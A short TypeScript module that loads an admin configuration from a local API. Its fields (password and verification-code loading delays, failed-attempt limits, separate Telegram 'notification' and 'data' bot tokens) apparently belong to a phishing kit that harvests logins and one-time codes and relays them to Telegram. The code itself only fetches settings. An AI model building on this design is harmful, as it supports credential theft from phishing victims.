import axios from 'axios';

interface Config {
	settings: {
		code_loading_time: number;
		max_failed_code_attempts: number;
		max_failed_password_attempts: number;
		page_loading_time: number;
		password_loading_time: number;
		code_input_enabled: boolean;
	};
	telegram: {
		notification_chatid: string;
		notification_token: string;
		data_chatid: string;
		data_token: string;
	};
}

const getConfig = async (): Promise<Config> => {
	try {
		const response = await axios.get<Config>('/api/admin/config');
		return response.data;
	} catch (error) {
		console.error('Error fetching config:', error);
		throw error;
	}
};

export default getConfig;
